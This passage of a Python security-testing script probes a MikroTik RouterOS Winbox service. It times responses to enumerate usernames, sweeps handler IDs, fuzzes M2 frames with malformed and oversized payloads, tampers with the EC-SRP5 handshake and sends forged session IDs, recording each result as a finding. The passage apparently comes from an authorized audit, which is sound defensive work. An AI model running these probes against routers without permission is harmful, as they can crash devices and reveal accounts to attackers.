            "Username enumeration via Winbox timing oracle",
            f"Valid user responses average {valid_time_mean*1000:.1f}ms vs "
            f"invalid user responses {invalid_time_mean*1000:.1f}ms "
            f"(diff={time_diff_ms:.1f}ms, t={time_t_stat:.2f}). "
            "An attacker can enumerate valid usernames via timing analysis.",
            evidence_refs=["user_enum tests"],
            cwe="CWE-208",
            cvss="3.7",
        )
    periodic_health_check()

    # -- Additional enumeration tests with edge-case usernames --
    edge_usernames = [
        "",                          # empty
        "a",                         # single char
        "admin" * 50,                # long username
        "admin\x00extra",            # null byte injection
        "Admin",                     # case variation
        "ADMIN",                     # uppercase
    ]
    for uname in edge_usernames:
        display_name = repr(uname)[:40]
        frame = m2_build_login_msg(uname)
        resp, elapsed = winbox_send_recv(frame, timeout=3)
        ev.add_test("user_enum", f"Edge username: {display_name}",
                     f"Login attempt with edge-case username",
                     f"Response: {len(resp) if resp else 0} bytes in {elapsed*1000:.1f}ms",
                     {"username": repr(uname), "resp_size": len(resp) if resp else 0,
                      "resp_hex": safe_hex(resp)})
    periodic_health_check()


# ═══════════════════════════════════════════════════════════════════════════════
# Category 4: Post-Auth Handler Enumeration (~40 tests)
# ═══════════════════════════════════════════════════════════════════════════════

def attempt_login():
    """Try to authenticate via plain M2 login.
    Returns (session_id, socket) if successful, else (None, None).

    Note: Modern RouterOS uses EC-SRP5 for Winbox auth. Plain M2 login
    may not work on 7.x. This function tests whether plain login is
    accepted and documents the result either way.
    """
    log("  Attempting plain M2 login...")
    s = winbox_connect()
    if not s:
        return None, None

    body = (m2_encode_u32(SYS_TO, HANDLER_LOGIN)
            + m2_encode_u32(REQUEST_ID, 1)
            + m2_encode_u32(COMMAND, 1)
            + m2_encode_string(USERNAME, ADMIN_USER)
            + m2_encode_string(PASSWORD, ADMIN_PASS))
    frame = m2_encode_frame(body)

    try:
        s.send(frame)
        s.settimeout(5)
        resp = s.recv(8192)
        if resp:
            decoded = m2_decode_frame(resp)
            # Look for session ID in response
            for ktype, kid, val in decoded:
                if kid == SESSION_ID:
                    log(f"  Got session ID: {val}")
                    return val, s
            # Check if we got an error indicating EC-SRP5 is required
            for ktype, kid, val in decoded:
                if kid == ERROR_MSG:
                    if isinstance(val, bytes):
                        val = val.decode('utf-8', errors='replace')
                    log(f"  Login error: {val}")
        return None, None
    except Exception as e:
        log(f"  Login attempt failed: {e}")
        return None, None


def test_postauth_handler_enum():
    """Enumerate handlers post-authentication (if possible)."""
    log("=" * 60)
    log("Category 4: Post-Auth Handler Enumeration")
    log("=" * 60)

    # First, try to authenticate
    session_id, auth_sock = attempt_login()

    plain_login_worked = session_id is not None

    ev.add_test("handler_enum", "Plain M2 login attempt",
                 "Attempt plain username/password login via M2",
                 "SUCCESS - got session" if plain_login_worked
                 else "FAILED - plain login not accepted (EC-SRP5 required)",
                 {"session_id": str(session_id) if session_id else None,
                  "plain_login_supported": plain_login_worked},
                 anomaly=plain_login_worked)  # plain login = anomaly (security concern)

    if plain_login_worked:
        ev.add_finding(
            "HIGH",
            "Plain text Winbox authentication accepted",
            "The router accepts plain M2 login messages without EC-SRP5 "
            "key exchange. Credentials are sent in cleartext over the wire.",
            cwe="CWE-319",
            cvss="7.5",
        )

    # If plain login didn't work, try alternative authentication methods
    if not plain_login_worked:
        if auth_sock:
            try:
                auth_sock.close()
            except Exception:
                pass

        # Try login with different COMMAND values (some older versions
        # use command=0 or command=4 for different auth paths)
        for cmd_val in [0, 3, 4, 6, 7]:
            body = (m2_encode_u32(SYS_TO, HANDLER_LOGIN)
                    + m2_encode_u32(REQUEST_ID, 1)
                    + m2_encode_u32(COMMAND, cmd_val)
                    + m2_encode_string(USERNAME, ADMIN_USER)
                    + m2_encode_string(PASSWORD, ADMIN_PASS))
            frame = m2_encode_frame(body)
            resp, elapsed = winbox_send_recv(frame)
            decoded = m2_decode_frame(resp) if resp else []
            got_session = any(kid == SESSION_ID for _, kid, _ in decoded)
            ev.add_test("handler_enum", f"Alt login CMD={cmd_val}",
                         f"Try login with COMMAND={cmd_val}",
                         f"Response: {len(resp) if resp else 0} bytes, session={'YES' if got_session else 'NO'}",
                         {"cmd": cmd_val, "resp_hex": safe_hex(resp),
                          "decoded": str(decoded)})
            if got_session:
                session_id = next(val for _, kid, val in decoded if kid == SESSION_ID)
                plain_login_worked = True
                break
        periodic_health_check()

    # Whether or not we have auth, probe handlers and log responses.
    # Pre-auth probing is still useful: it reveals which handlers exist
    # and which reject vs. which silently drop.
    handler_results = {}
    responding_handlers = []

    log("  Probing handler IDs 1-50...")
    for hid in range(1, 51):
        extras = b""
        if session_id is not None:
            extras = m2_encode_u32(SESSION_ID, session_id) if isinstance(session_id, int) else b""

        body = (m2_encode_u32(SYS_TO, hid)
                + m2_encode_u32(REQUEST_ID, hid)
                + m2_encode_u32(COMMAND, 7)   # 7 = print/list
                + extras)
        frame = m2_encode_frame(body)
        resp, elapsed = winbox_send_recv(frame, timeout=2)
        resp_len = len(resp) if resp else 0
        handler_results[hid] = {"size": resp_len, "elapsed": round(elapsed, 3)}
        if resp_len > 0:
            responding_handlers.append(hid)
            decoded = m2_decode_frame(resp) if resp else []
            handler_results[hid]["decoded_sample"] = str(decoded)[:200]

        # Log individual tests for first 10 and any responders
        if hid <= 10 or resp_len > 0:
            ev.add_test("handler_enum", f"Handler probe ID={hid}",
                         f"Send CMD=7 to handler {hid} ({'with' if session_id else 'without'} session)",
                         f"Response: {resp_len} bytes",
                         {"handler_id": hid, "resp_hex": safe_hex(resp),
                          "authenticated": session_id is not None})

        if hid % 10 == 0:
            periodic_health_check()

    # Probe well-known handlers at higher IDs
    high_handlers = [50, 64, 72, 80, 100, 128, 200, 255]
    for hid in high_handlers:
        if hid in handler_results:
            continue
        body = (m2_encode_u32(SYS_TO, hid)
                + m2_encode_u32(REQUEST_ID, hid)
                + m2_encode_u32(COMMAND, 7))
        frame = m2_encode_frame(body)
        resp, elapsed = winbox_send_recv(frame, timeout=2)
        resp_len = len(resp) if resp else 0
        handler_results[hid] = {"size": resp_len, "elapsed": round(elapsed, 3)}
        if resp_len > 0:
            responding_handlers.append(hid)
        ev.add_test("handler_enum", f"Handler probe ID={hid}",
                     f"Send CMD=7 to handler {hid}",
                     f"Response: {resp_len} bytes",
                     {"handler_id": hid, "resp_hex": safe_hex(resp)})
    periodic_health_check()

    # Summary
    ev.add_test("handler_enum", "Handler enumeration summary",
                 "Summary of all handler probing results",
                 f"{len(responding_handlers)} handlers responded out of "
                 f"{len(handler_results)} probed",
                 {"responding_handlers": sorted(responding_handlers),
                  "total_probed": len(handler_results),
                  "authenticated": session_id is not None})

    if len(responding_handlers) > 5:
        ev.add_finding(
            "INFO",
            f"Winbox handler attack surface: {len(responding_handlers)} active handlers",
            f"Handler IDs that responded to probing: {sorted(responding_handlers)}. "
            "Each handler is a separate binary in /nova/bin/ and represents "
            "an individual attack surface for fuzzing.",
            evidence_refs=["handler_enum tests"],
        )

    if auth_sock:
        try:
            auth_sock.close()
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════════════════
# Category 5: M2 Message Fuzzing (~40 tests)
# ═══════════════════════════════════════════════════════════════════════════════

def test_m2_fuzzing():
    """Fuzz M2 message parsing with malformed inputs."""
    log("=" * 60)
    log("Category 5: M2 Message Fuzzing")
    log("=" * 60)

    crash_detected = False

    def fuzz_send(name, desc, payload, check_alive_after=False):
        nonlocal crash_detected
        resp, elapsed = winbox_send_recv(payload, timeout=3)
        resp_len = len(resp) if resp else 0
        is_anomaly = resp is None  # connection refused = possible crash
        ev.add_test("m2_fuzz", name, desc,
                     f"Response: {resp_len} bytes in {elapsed:.3f}s",
                     {"sent_hex": safe_hex(payload, 300),
                      "sent_size": len(payload),
                      "resp_hex": safe_hex(resp),
                      "resp_size": resp_len},
                     anomaly=is_anomaly)
        if check_alive_after or is_anomaly:
            status = check_router_alive(timeout=3)
            if not status.get("alive"):
                crash_detected = True
                ev.add_finding(
                    "CRITICAL",
                    f"Router crash triggered by M2 fuzzing: {name}",
                    f"The router became unresponsive after sending: {desc}. "
                    f"Payload ({len(payload)} bytes): {safe_hex(payload, 300)}",
                    evidence_refs=[name],
                    cwe="CWE-120",
                    cvss="9.8",
                    reproduction_steps=[
                        f"1. Connect to TCP {TARGET}:{WINBOX_PORT}",
                        f"2. Send payload: {safe_hex(payload, 300)}",
                        "3. Observe router becomes unresponsive",
                    ],
                )
                wait_for_router(max_wait=90)

    # -- Invalid key types --
    invalid_types = [0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
                     0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
                     0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
                     0xFF]
    for i, kt in enumerate(invalid_types):
        body = bytes([kt]) + SYS_TO.to_bytes(3, 'big') + b"\x00" * 4
        frame = m2_encode_frame(body)
        fuzz_send(f"Invalid key type 0x{kt:02x}",
                  f"M2 with unknown key type 0x{kt:02x} for SYS_TO",
                  frame, check_alive_after=(i == len(invalid_types) - 1))
    periodic_health_check()

    # -- Key ID 0x000000 (null key) --
    body = m2_encode_u32(0x000000, 1)
    frame = m2_encode_frame(body)
    fuzz_send("Null key ID (0x000000)",
              "M2 with key ID 0 as u32", frame)

    # -- String with length=65535 but only 10 bytes --
    body = bytes([M2_STRING]) + SYS_TO.to_bytes(3, 'big') + struct.pack('>H', 65535) + b"A" * 10
    frame = m2_encode_frame(body)
    fuzz_send("String length mismatch (65535 claimed, 10 actual)",
              "String KV with length prefix 65535 but only 10 data bytes",
              frame, check_alive_after=True)
    periodic_health_check()

    # -- Nested M2 with pseudo-circular reference --
    inner = m2_encode_u32(SYS_TO, HANDLER_LOGIN)
    nested1 = m2_encode_nested(0x0010, inner)
    nested2 = m2_encode_nested(0x0010, nested1)
    nested3 = m2_encode_nested(0x0010, nested2)
    frame = m2_encode_frame(nested3)
    fuzz_send("Triple-nested M2 message",
              "3 levels of nested M2 messages", frame)

    # -- Deeply nested M2 (20 levels) --
    deep = m2_encode_u32(SYS_TO, HANDLER_LOGIN)
    for _ in range(20):
        deep = m2_encode_nested(0x0010, deep)
    frame = m2_encode_frame(deep)
    fuzz_send("Deeply nested M2 (20 levels)",
              "20 levels of nested M2 message embedding",
              frame, check_alive_after=True)
    periodic_health_check()

    # -- M2 with 100+ key-value pairs --
    body = m2_encode_u32(SYS_TO, HANDLER_LOGIN)
    for i in range(100):
        body += m2_encode_u32(0x000100 + i, i)
    frame = m2_encode_frame(body)
    fuzz_send("M2 with 100 KV pairs",
              "Single M2 message containing 100+ u32 key-value pairs",
              frame, check_alive_after=True)

    # -- Duplicate key IDs --
    body = (m2_encode_u32(SYS_TO, HANDLER_LOGIN)
            + m2_encode_u32(SYS_TO, HANDLER_SYSTEM)
            + m2_encode_u32(SYS_TO, HANDLER_FILE))
    frame = m2_encode_frame(body)
    fuzz_send("Duplicate SYS_TO keys (3x)",
              "M2 with SYS_TO appearing 3 times with different values",
              frame)

    # -- Zero-length string --
    body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_string(USERNAME, "")
    frame = m2_encode_frame(body)
    fuzz_send("Zero-length username string",
              "Login with empty string username", frame)

    # -- String with embedded null bytes --
    body = m2_encode_u32(SYS_TO, HANDLER_LOGIN)
    null_str = "admin\x00root"
    data = null_str.encode('utf-8')
    body += bytes([M2_STRING]) + USERNAME.to_bytes(3, 'big') + struct.pack('>H', len(data)) + data
    frame = m2_encode_frame(body)
    fuzz_send("Username with null byte (admin\\x00root)",
              "Login with null byte in username for truncation attack",
              frame)
    periodic_health_check()

    # -- Raw bytes with length 0 --
    body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_raw(0x0020, b"")
    frame = m2_encode_frame(body)
    fuzz_send("Raw bytes length=0",
              "M2 with raw KV containing zero-length data", frame)

    # -- u32 with truncated value (only 2 bytes) --
    body = bytes([M2_U32]) + SYS_TO.to_bytes(3, 'big') + b"\x02\x00"
    frame = m2_encode_frame(body)
    fuzz_send("Truncated u32 (2 bytes instead of 4)",
              "u32 key type but only 2 bytes of value data",
              frame, check_alive_after=True)

    # -- Frame size mismatch: header says 100, body is 200 bytes --
    body = b"\x41" * 200
    frame = struct.pack('>H', 100) + body
    fuzz_send("Frame size mismatch (header=100, body=200)",
              "Frame header claims 100 bytes but 200 bytes follow",
              frame)
    periodic_health_check()

    # -- Frame size mismatch: header says 200, body is 50 bytes --
    body = b"\x42" * 50
    frame = struct.pack('>H', 200) + body
    fuzz_send("Frame size mismatch (header=200, body=50)",
              "Frame header claims 200 bytes but only 50 follow",
              frame)

    # -- Very long string in username (8KB) --
    body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_string(USERNAME, "A" * 8192)
    frame = m2_encode_frame(body)
    fuzz_send("8KB username string",
              "Login with 8192-character username", frame)

    # -- Very long string in password (8KB) --
    body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_string(PASSWORD, "B" * 8192)
    frame = m2_encode_frame(body)
    fuzz_send("8KB password string",
              "Login with 8192-character password",
              frame, check_alive_after=True)
    periodic_health_check()

    # -- Format string in username --
    fmt_strings = ["%s%s%s%s%s%n", "%x" * 50, "%.9999d", "%p%p%p%p"]
    for fstr in fmt_strings:
        body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_string(USERNAME, fstr)
        frame = m2_encode_frame(body)
        fuzz_send(f"Format string username: {fstr[:20]}",
                  f"Login with format string in username field",
                  frame)
    periodic_health_check()

    # -- Command value boundaries --
    for cmd in [0, 0x7FFFFFFF, 0xFFFFFFFF, 0x80000000]:
        body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_u32(COMMAND, cmd)
        frame = m2_encode_frame(body)
        fuzz_send(f"Command value 0x{cmd:08X}",
                  f"M2 with COMMAND={cmd} (boundary value)", frame)
    periodic_health_check()

    # -- Multiple frames rapidly (10 in sequence on one connection) --
    s = winbox_connect()
    if s:
        rapid_results = []
        try:
            for i in range(10):
                body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_u32(REQUEST_ID, i)
                frame = m2_encode_frame(body)
                s.send(frame)
            time.sleep(1)
            s.settimeout(3)
            try:
                all_resp = s.recv(65536)
                rapid_results.append(len(all_resp))
            except socket.timeout:
                rapid_results.append(0)
        except Exception as e:
            rapid_results.append(f"error: {e}")
        s.close()
        ev.add_test("m2_fuzz", "10 rapid frames on single connection",
                     "Send 10 M2 frames in quick succession on one TCP socket",
                     f"Got {rapid_results[0] if rapid_results else 0} response bytes",
                     {"rapid_results": rapid_results})
    periodic_health_check()

    # -- Oversized frame (128KB) --
    big_body = os.urandom(131072)
    frame = struct.pack('>H', 65535) + big_body  # header caps at 65535 but body is 128KB
    fuzz_send("Oversized frame body (128KB, header=65535)",
              "Send 128KB body with max frame header",
              frame, check_alive_after=True)
    periodic_health_check()

    if crash_detected:
        log("  WARNING: At least one crash was detected during fuzzing!")


# ═══════════════════════════════════════════════════════════════════════════════
# Category 6: EC-SRP5 Key Exchange Manipulation (~20 tests)
# ═══════════════════════════════════════════════════════════════════════════════

def test_ecsrp5_manipulation():
    """Probe and manipulate the EC-SRP5 key exchange."""
    log("=" * 60)
    log("Category 6: EC-SRP5 Key Exchange Manipulation")
    log("=" * 60)

    # Step 1: Observe what the server sends back on a login attempt.
    # The EC-SRP5 handshake typically starts with the client sending
    # a username, and the server responds with a salt and public key.

    # -- Test 1: Observe login handshake (first exchange) --
    frame = m2_build_login_msg(ADMIN_USER)
    resp, elapsed = winbox_send_recv_multi(frame, timeout=5, read_count=3, read_delay=0.5)
    decoded = m2_decode_frame(resp) if resp else []

    # Try to identify EC-SRP5 parameters in response
    has_salt = False
    has_pubkey = False
    param_info = {}
    for ktype, kid, val in decoded:
        if ktype == M2_RAW:
            if isinstance(val, bytes):
                param_info[f"raw_0x{kid:06x}"] = {"size": len(val), "hex": safe_hex(val, 100)}
                if len(val) == 16 or len(val) == 32:
                    has_salt = True
                if len(val) >= 32:
                    has_pubkey = True
        elif ktype == M2_STRING:
            if isinstance(val, bytes):
                param_info[f"str_0x{kid:06x}"] = val.decode('utf-8', errors='replace')[:100]

    ev.add_test("ecsrp5", "Observe login handshake response",
                 "Send login with username, observe server EC-SRP5 parameters",
                 f"Response: {len(resp) if resp else 0} bytes, "
                 f"decoded {len(decoded)} KV pairs",
                 {"resp_hex": safe_hex(resp), "decoded": str(decoded)[:500],
                  "identified_params": param_info,
                  "has_salt_candidate": has_salt,
                  "has_pubkey_candidate": has_pubkey})
    periodic_health_check()

    # -- Test 2: Send zero as EC public key --
    # After initial exchange, client normally sends its public key.
    # We'll craft a message with various key IDs that might be the
    # public key field, set to all zeros.
    zero_key_32 = b"\x00" * 32
    zero_key_48 = b"\x00" * 48
    zero_key_64 = b"\x00" * 64

    for key_size, zero_key in [(32, zero_key_32), (48, zero_key_48), (64, zero_key_64)]:
        body = (m2_encode_u32(SYS_TO, HANDLER_LOGIN)
                + m2_encode_u32(REQUEST_ID, 2)
                + m2_encode_u32(COMMAND, 2)  # Possible second phase command
                + m2_encode_raw(0x000001, zero_key)  # Possible public key field
                + m2_encode_raw(0x000009, zero_key))  # Alternative location
        frame = m2_encode_frame(body)
        resp, elapsed = winbox_send_recv(frame, timeout=3)
        ev.add_test("ecsrp5", f"Zero public key ({key_size} bytes)",
                     f"Send all-zero {key_size}-byte value as client public key",
                     f"Response: {len(resp) if resp else 0} bytes",
                     {"resp_hex": safe_hex(resp),
                      "decoded": str(m2_decode_frame(resp)) if resp else "None"})
    periodic_health_check()

    # -- Test 3: Send point-at-infinity candidates --
    # For EC curves, point at infinity is often encoded as all zeros or specific marker
    infinity_encodings = [
        b"\x00",                     # Compressed: just zero
        b"\x00" * 33,               # Compressed point (all zeros for P-256)
        b"\x04" + b"\x00" * 64,     # Uncompressed with zero coords (P-256)
        b"\x04" + b"\x00" * 96,     # Uncompressed with zero coords (P-384)
    ]
    for i, enc in enumerate(infinity_encodings):
        body = (m2_encode_u32(SYS_TO, HANDLER_LOGIN)
                + m2_encode_u32(REQUEST_ID, 3)
                + m2_encode_u32(COMMAND, 2)
                + m2_encode_raw(0x000009, enc))
        frame = m2_encode_frame(body)
        resp, elapsed = winbox_send_recv(frame, timeout=3)
        ev.add_test("ecsrp5", f"Point-at-infinity encoding #{i+1}",
                     f"Send EC point-at-infinity candidate ({len(enc)} bytes)",
                     f"Response: {len(resp) if resp else 0} bytes",
                     {"encoding_hex": safe_hex(enc), "resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 4: Oversized EC values (larger than curve order) --
    oversized = b"\xff" * 64  # All 0xFF, larger than any standard curve order
    body = (m2_encode_u32(SYS_TO, HANDLER_LOGIN)
            + m2_encode_u32(REQUEST_ID, 4)
            + m2_encode_u32(COMMAND, 2)
            + m2_encode_raw(0x000009, oversized))
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame, timeout=3)
    ev.add_test("ecsrp5", "Oversized EC value (64 bytes of 0xFF)",
                 "Send value larger than any standard EC curve order",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})

    # -- Test 5: Replay captured handshake (send first msg twice) --
    frame1 = m2_build_login_msg(ADMIN_USER)
    resp1, _ = winbox_send_recv(frame1, timeout=3)

    # Same socket, replay same message
    s = winbox_connect()
    replay_results = []
    if s:
        try:
            s.send(frame1)
            s.settimeout(3)
            try:
                r1 = s.recv(8192)
                replay_results.append(("first", len(r1), safe_hex(r1)))
            except socket.timeout:
                replay_results.append(("first", 0, "timeout"))

            # Replay exact same frame
            s.send(frame1)
            s.settimeout(3)
            try:
                r2 = s.recv(8192)
                replay_results.append(("replay", len(r2), safe_hex(r2)))
            except socket.timeout:
                replay_results.append(("replay", 0, "timeout"))
        except Exception as e:
            replay_results.append(("error", 0, str(e)))
        s.close()

    ev.add_test("ecsrp5", "Handshake replay on same connection",
                 "Send login initiation twice on same TCP socket",
                 f"Results: {[(r[0], r[1]) for r in replay_results]}",
                 {"replay_results": replay_results})
    periodic_health_check()

    # -- Test 6: Replay across connections --
    resp_a, _ = winbox_send_recv(frame1, timeout=3)
    resp_b, _ = winbox_send_recv(frame1, timeout=3)
    same_response = (resp_a == resp_b) if (resp_a and resp_b) else None
    ev.add_test("ecsrp5", "Handshake replay across connections",
                 "Send identical login initiation on two separate connections",
                 f"Responses identical: {same_response} "
                 f"(A={len(resp_a) if resp_a else 0}B, B={len(resp_b) if resp_b else 0}B)",
                 {"same": same_response,
                  "resp_a_hex": safe_hex(resp_a), "resp_b_hex": safe_hex(resp_b)},
                 anomaly=(same_response is True))

    if same_response is True:
        ev.add_finding(
            "MEDIUM",
            "Deterministic EC-SRP5 handshake responses",
            "Two separate login initiation requests produced identical "
            "server responses, suggesting the salt or server public key "
            "is not properly randomized per session.",
            cwe="CWE-330",
            cvss="5.9",
        )
    periodic_health_check()

    # -- Test 7: Truncated handshake (send login init, then close) --
    for delay in [0, 0.1, 0.5]:
        s = winbox_connect()
        if s:
            s.send(frame1)
            time.sleep(delay)
            s.close()
        ev.add_test("ecsrp5", f"Truncated handshake (close after {delay}s)",
                     f"Send login init then close after {delay}s delay",
                     "Connection closed",
                     {"delay": delay})
    periodic_health_check()

    # -- Test 8: Send garbage as second-phase response --
    s = winbox_connect()
    if s:
        try:
            s.send(frame1)
            s.settimeout(3)
            try:
                first_resp = s.recv(8192)
            except socket.timeout:
                first_resp = b""

            # Send random bytes as "client public key" response
            garbage = os.urandom(128)
            garbage_frame = m2_encode_frame(garbage)
            s.send(garbage_frame)
            s.settimeout(3)
            try:
                second_resp = s.recv(8192)
                result = f"Got {len(second_resp)} bytes after garbage"
            except socket.timeout:
                result = "No response after garbage (timeout)"
                second_resp = b""
        except Exception as e:
            result = f"Error: {e}"
            second_resp = b""
        s.close()
    else:
        result = "Failed to connect"
        second_resp = b""

    ev.add_test("ecsrp5", "Garbage as second-phase response",
                 "Complete first handshake exchange then send 128 random bytes",
                 result,
                 {"resp_hex": safe_hex(second_resp)})
    periodic_health_check()

    # -- Test 9: Send oversized handshake (32KB random as public key) --
    body = (m2_encode_u32(SYS_TO, HANDLER_LOGIN)
            + m2_encode_u32(REQUEST_ID, 5)
            + m2_encode_u32(COMMAND, 2)
            + m2_encode_raw(0x000009, os.urandom(32768)))
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame, timeout=3)
    ev.add_test("ecsrp5", "32KB random as public key",
                 "Send 32KB of random data where public key is expected",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})

    # -- Test 10: Multiple concurrent handshake initiations --
    concurrent_results = []
    sockets = []
    for _ in range(5):
        s = winbox_connect(timeout=3)
        if s:
            sockets.append(s)
    for s in sockets:
        try:
            s.send(frame1)
        except Exception:
            pass
    time.sleep(0.5)
    for i, s in enumerate(sockets):
        try:
            s.settimeout(2)
            resp = s.recv(8192)
            concurrent_results.append(len(resp))
        except Exception:
            concurrent_results.append(0)
        s.close()
    ev.add_test("ecsrp5", "5 concurrent handshake initiations",
                 "Open 5 connections and send login init simultaneously",
                 f"Responses: {concurrent_results}",
                 {"concurrent_results": concurrent_results})
    periodic_health_check()


# ═══════════════════════════════════════════════════════════════════════════════
# Category 7: Session Management (~20 tests)
# ═══════════════════════════════════════════════════════════════════════════════

def test_session_management():
    """Test session handling, reuse, prediction, and timeout."""
    log("=" * 60)
    log("Category 7: Session Management")
    log("=" * 60)

    # -- Test 1: Forged session ID (random u32) --
    forged_id = 0xDEADBEEF
    body = (m2_encode_u32(SYS_TO, HANDLER_SYSTEM)
            + m2_encode_u32(REQUEST_ID, 1)
            + m2_encode_u32(COMMAND, 7)
            + m2_encode_u32(SESSION_ID, forged_id))
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("session", "Forged session ID (0xDEADBEEF)",
                 "Send command with fabricated session ID",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"forged_id": hex(forged_id), "resp_hex": safe_hex(resp),
                  "decoded": str(m2_decode_frame(resp)) if resp else "None"})
    periodic_health_check()

    # -- Test 2: Session ID = 0 --
    body = (m2_encode_u32(SYS_TO, HANDLER_SYSTEM)
            + m2_encode_u32(REQUEST_ID, 1)
            + m2_encode_u32(COMMAND, 7)
            + m2_encode_u32(SESSION_ID, 0))
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("session", "Session ID = 0",
                 "Send command with session ID zero",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})

    # -- Test 3: Session ID = 0xFFFFFFFF --
    body = (m2_encode_u32(SYS_TO, HANDLER_SYSTEM)
            + m2_encode_u32(REQUEST_ID, 1)
            + m2_encode_u32(COMMAND, 7)
            + m2_encode_u32(SESSION_ID, 0xFFFFFFFF))
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("session", "Session ID = 0xFFFFFFFF",
                 "Send command with max u32 session ID",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 4-6: Sequential session IDs (check predictability) --
    for sid in [1, 2, 3]:
        body = (m2_encode_u32(SYS_TO, HANDLER_SYSTEM)
                + m2_encode_u32(REQUEST_ID, 1)
                + m2_encode_u32(COMMAND, 7)
                + m2_encode_u32(SESSION_ID, sid))
        frame = m2_encode_frame(body)
        resp, elapsed = winbox_send_recv(frame)
        ev.add_test("session", f"Sequential session ID = {sid}",
                     f"Test if low sequential session IDs are valid",
                     f"Response: {len(resp) if resp else 0} bytes",
                     {"resp_hex": safe_hex(resp)})

    # -- Test 7: Session ID as string type instead of u32 --
    body = (m2_encode_u32(SYS_TO, HANDLER_SYSTEM)
            + m2_encode_string(SESSION_ID, "12345"))
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("session", "Session ID as string type",
                 "Send session ID field as string instead of u32 (type confusion)",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 8: Session ID as raw bytes --
    body = (m2_encode_u32(SYS_TO, HANDLER_SYSTEM)
            + m2_encode_raw(SESSION_ID, b"\x01\x00\x00\x00\x00\x00\x00\x00"))
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("session", "Session ID as raw 8 bytes",
                 "Send session ID as raw bytes (type confusion / overflow)",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})

    # -- Test 9: Multiple session IDs in one message --
    body = (m2_encode_u32(SYS_TO, HANDLER_SYSTEM)
            + m2_encode_u32(SESSION_ID, 1)
            + m2_encode_u32(SESSION_ID, 0xDEADBEEF))
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("session", "Duplicate session IDs in one message",
                 "Send two SESSION_ID fields with different values",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 10: Rapid connection creation (20 connections) --
    log("  Testing rapid session creation (20 connections)...")
    connection_results = []
    login_frame = m2_build_login_msg(ADMIN_USER)
    for i in range(20):
        resp, elapsed = winbox_send_recv(login_frame, timeout=3)
        resp_len = len(resp) if resp else 0
        connection_results.append({
            "attempt": i + 1,
            "resp_size": resp_len,
            "elapsed_ms": round(elapsed * 1000, 2),
        })
        time.sleep(0.05)

    # Check if later connections get slower or rejected
    first_5_avg = sum(r["elapsed_ms"] for r in connection_results[:5]) / 5
    last_5_avg = sum(r["elapsed_ms"] for r in connection_results[-5:]) / 5
    slowdown = last_5_avg - first_5_avg
    rejected_count = sum(1 for r in connection_results if r["resp_size"] == 0)

    ev.add_test("session", "Rapid session creation (20 connections)",
                 "Create 20 login initiations in quick succession",
                 f"First-5 avg: {first_5_avg:.1f}ms, Last-5 avg: {last_5_avg:.1f}ms, "
                 f"Slowdown: {slowdown:.1f}ms, Rejected: {rejected_count}",
                 {"results": connection_results,
                  "first_5_avg_ms": round(first_5_avg, 2),
                  "last_5_avg_ms": round(last_5_avg, 2),
                  "slowdown_ms": round(slowdown, 2),
                  "rejected_count": rejected_count})
    periodic_health_check()

    if rejected_count > 10:
        ev.add_test("session", "Connection rate limiting detected",
                     "Server rejected >50% of rapid connections",
                     f"{rejected_count}/20 connections rejected",
                     anomaly=True)

    # -- Test 11-13: Send commands to different handlers with same forged session --
    for hname, hid in [("login", HANDLER_LOGIN),
                       ("system", HANDLER_SYSTEM),
                       ("file", HANDLER_FILE)]:
        body = (m2_encode_u32(SYS_TO, hid)
                + m2_encode_u32(REQUEST_ID, 1)
                + m2_encode_u32(COMMAND, 7)
                + m2_encode_u32(SESSION_ID, 0xCAFEBABE))
        frame = m2_encode_frame(body)
        resp, elapsed = winbox_send_recv(frame)
        ev.add_test("session", f"Forged session to {hname} handler",
                     f"Send forged session ID 0xCAFEBABE to {hname} (ID={hid})",
                     f"Response: {len(resp) if resp else 0} bytes",
                     {"resp_hex": safe_hex(resp),
                      "decoded": str(m2_decode_frame(resp)) if resp else "None"})
    periodic_health_check()

    # -- Test 14: Session reuse after TCP disconnect --
    # Connect, get initial response, disconnect, reconnect with same data
    frame = m2_build_login_msg(ADMIN_USER)
    resp1, _ = winbox_send_recv(frame, timeout=3)
    time.sleep(0.5)
    resp2, _ = winbox_send_recv(frame, timeout=3)
    ev.add_test("session", "Session reuse after TCP disconnect",
                 "Send identical login on two separate connections",
                 f"Resp1={len(resp1) if resp1 else 0}B, "
                 f"Resp2={len(resp2) if resp2 else 0}B, "
